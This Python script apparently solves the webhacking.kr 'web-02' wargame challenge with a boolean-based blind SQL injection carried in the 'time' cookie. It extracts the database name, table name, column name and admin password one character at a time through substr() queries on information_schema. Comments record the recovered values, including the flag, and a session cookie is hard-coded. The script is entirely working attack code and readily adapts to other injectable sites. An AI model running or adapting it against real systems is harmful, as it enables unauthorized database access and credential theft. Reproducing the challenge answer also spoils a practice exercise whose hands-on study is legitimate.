import requests
import string


alphabet = string.ascii_letters + string.digits + string.punctuation
url = "https://webhacking.kr/challenge/web-02/"


# dbLength 6
def dbLength():
    for i in range(1,101):
        cookie = {
            "PHPSESSID" : "0j8iso619j2kuprl9e2hp14eqk",
            "time" :  f"1702640050 and length(database())={i}"
        }
        req = requests.get(url,cookies=cookie)
        if "09:00:01" in req.text:
            print(f"dbLength : {i}")
            return
        print("Fail")

# dbName chall2
def dbName():
    dbName = ""
    for i in range(1,7):
        for j in alphabet:
            cookie = {
                "PHPSESSID" : "0j8iso619j2kuprl9e2hp14eqk",
                "time" :  f"1702640050 and substr(database(),{i},1)='{j}'"
            }
            req = requests.get(url,cookies=cookie)
            if "09:00:01" in req.text:
                dbName += j
                print(f"dbName : {dbName}")
                break

# tableLength 13
def tableLength():
    for i in range(1,101):
        cookie = {
            "PHPSESSID" : "0j8iso619j2kuprl9e2hp14eqk",
            "time" :  f"1702640050 and length((select table_name from information_schema.tables where table_schema='chall2' limit 0,1))={i}"
        }

        req = requests.get(url,cookies=cookie)
        if "09:00:01" in req.text:
            print(f"tableLength : {i}")
            break

# tableName admin_area_pw
def tableName():
    tableName = ""
    for i in range(1,14):
        for j in alphabet:
            cookie = {
                "PHPSESSID" : "0j8iso619j2kuprl9e2hp14eqk",
                "time" :  f"1702640050 and substr((select table_name from information_schema.tables where table_schema='chall2' limit 0,1),{i},1)='{j}'"
            }

            req = requests.get(url,cookies=cookie)
            if "09:00:01" in req.text:
                tableName += j
                print(f"tableName : {tableName}")
                break

# columnLength 2
def columnLength():
    for i in range(1,101):
        cookie = {
            "PHPSESSID" : "0j8iso619j2kuprl9e2hp14eqk",
            "time" :  f"1702640050 and length((select column_name from information_schema.columns where table_name='admin_area_pw' limit 0,1))={i}"
        }

        req = requests.get(url,cookies=cookie)
        if "09:00:01" in req.text:
            print(f"columnLength : {i}")
            break

# columnName pw
def columnName():
    columnName = ""
    for i in range(1,3):
        for j in alphabet:
            cookie = {
                "PHPSESSID" : "0j8iso619j2kuprl9e2hp14eqk",
                "time" :  f"1702640050 and substr((select column_name from information_schema.columns where table_name='admin_area_pw' limit 1,1),{i},1)='{j}'"
            }

            req = requests.get(url,cookies=cookie)
            if "09:00:01" in req.text:
                columnName += j
                print(f"columnName : {columnName}")
                break

# pwLength 17
def pwLength():
    for i in range(1,101):
        cookie = {
            "PHPSESSID" : "0j8iso619j2kuprl9e2hp14eqk",
            "time" :  f"1702640050 and length((select pw from admin_area_pw limit 0,1)) = {i}"
        }
        req = requests.get(url,cookies=cookie)
        if "09:00:01" in req.text:
            print(f"flagLength : {i}")
            break

# pw kudos_to_beistlab
def pw():
    pw = ""
    for i in range(1,18):
        for j in alphabet:
            cookie = {
                "PHPSESSID" : "0j8iso619j2kuprl9e2hp14eqk",
                "time" :  f"1702640050 and substr((select pw from admin_area_pw),{i},1)='{j}'"
            }
            req = requests.get(url,cookies=cookie)
            if "09:00:01" in req.text:
                pw += j
                print(f"pw : {pw}")
                break

pw()
